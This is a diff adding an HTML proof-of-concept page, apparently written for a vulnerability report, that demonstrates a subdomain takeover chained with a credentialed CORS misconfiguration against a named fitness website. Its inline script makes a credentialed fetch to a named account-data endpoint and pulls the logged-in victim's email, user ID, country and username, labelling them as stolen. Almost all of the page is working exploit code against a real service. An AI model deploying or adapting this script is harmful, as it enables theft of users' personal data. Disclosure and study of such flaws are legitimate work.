@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security PoC - MyFitnessPal Research</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f8f9fa; color: #212529; text-align: center; padding: 50px; }
+        .container { max-width: 700px; margin: auto; background: white; padding: 40px; border-radius: 12px; border: 1px solid #dee2e6; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h1 { color: #dc3545; margin-bottom: 10px; }
+        .alert { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: 15px; border-radius: 8px; margin: 20px 0; font-weight: bold; }
+        .instructions { font-size: 1.1em; color: #6c757d; line-height: 1.6; }
+        #status-box { margin-top: 30px; font-weight: bold; color: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Vulnerability PoC: link2.brazestaging</h1>
+        <p class="instructions">This page is a Proof of Concept (PoC) demonstrating a <strong>Subdomain Takeover</strong> chained with a <strong>Credentialed CORS Misconfiguration</strong>.</p>
+        
+        <div class="alert">
+            [!] IMPACT: Sensitive PII (Email, UserID, Private Data) is being exfiltrated from www.myfitnesspal.com via this hijacked subdomain.
+        </div>
+
+        <p class="instructions">To verify the exploit: Open the <strong>Browser Developer Tools (F12)</strong> and check the <strong>Console</strong> tab to see the stolen session data.</p>
+        
+        <div id="status-box">Status: Attack script running...</div>
+    </div>
+
+    <script>
+        // Target endpoint that holds sensitive PII
+        const targetUrl = "https://www.myfitnesspal.com/_next/data/s-WBAkWPzZ6csnMtXY6mu/en/account/confirm-delete.json";
+
+        console.log("%c[+] EXPLOIT INITIALIZED", "color: orange; font-weight: bold; font-size: 14px;");
+
+        // The Exploit: Credentials 'include' bypasses SameSite=Lax because we are on a trusted subdomain
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include' 
+        })
+        .then(response => {
+            const corsHeader = response.headers.get("Access-Control-Allow-Origin");
+            console.log("%c[+] VULNERABILITY CONFIRMED: Server allowed Origin: " + corsHeader, "color: green; font-weight: bold;");
+            return response.json();
+        })
+        .then(data => {
+            // Extracting the high-value PII from the JSON response
+            const victimData = data.pageProps.session.user;
+            
+            console.log("%c[!!!] SENSITIVE DATA EXFILTRATED:", "background: red; color: white; padding: 5px; font-size: 16px;");
+            console.table({
+                "Property": "Value",
+                "Stolen Email": victimData.email,
+                "User ID": victimData.userId,
+                "Country": victimData.country,
+                "Username": victimData.username
+            });
+            
+            document.getElementById('status-box').innerHTML = "✅ SUCCESS: Data Stolen. See Console.";
+            document.getElementById('status-box').style.color = "#dc3545";
+        })
+        .catch(error => {
+            console.log("%c[-] Exploit Error: Make sure you are logged into MyFitnessPal and HTTPS is active.", "color: red;");
+            document.getElementById('status-box').innerHTML = "❌ Error: Could not reach main site (check login/HTTPS).";
+        });
+    </script>
+</body>
+</html>
